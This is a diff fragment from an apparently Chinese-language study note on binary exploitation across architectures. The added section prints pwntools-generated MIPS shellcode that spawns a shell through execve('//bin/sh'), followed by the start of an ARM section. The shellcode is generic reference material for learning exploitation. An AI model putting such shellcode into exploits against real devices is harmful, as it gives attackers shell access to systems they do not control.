@@ -132,6 +132,48 @@ syscall 0x40404
 shellcode = asm(shellcode)
 ```
 
+`pwntools`的如下：
+
+```assembly
+/* execve(path='//bin/sh', argv=['sh'], envp={}) */
+/* push b'//bin/sh\x00' */
+li $t1, 0x2f2f6269
+sw $t1, -12($sp)
+li $t1, 0x6e2f7368
+sw $t1, -8($sp)
+sw $zero, -4($sp)
+addiu $sp, $sp, -12
+add $a0, $sp, $0 /* mov $a0, $sp */
+/* push argument array ['sh\x00'] */
+/* push b'sh\x00\x00' */
+li $t9, ~0x73680000
+not $t1, $t9
+sw $t1, -4($sp)
+addiu $sp, $sp, -4
+slti $a1, $zero, 0xFFFF /* $a1 = 0 */
+sw $a1, -4($sp)
+addi $sp, $sp, -4 /* null terminate */
+li $t9, ~4
+not $a1, $t9
+add $a1, $sp, $a1
+sw $a1, -4($sp)
+addi $sp, $sp, -4 /* 'sh\x00' */
+add $a1, $sp, $0 /* mov $a1, $sp */
+/* push argument array [] */
+/* push b'\x00' */
+sw $zero, -4($sp)
+addiu $sp, $sp, -4
+slti $a2, $zero, 0xFFFF /* $a2 = 0 */
+sw $a2, -4($sp)
+addi $sp, $sp, -4 /* null terminate */
+add $a2, $sp, $0 /* mov $a2, $sp */
+/* setregs noop */
+/* call execve() */
+ori $v0, $zero, (4000 + 11)
+syscall 0x40404
+
+```
+
 # arm
 
 调试方面都和`mips`大差不差。
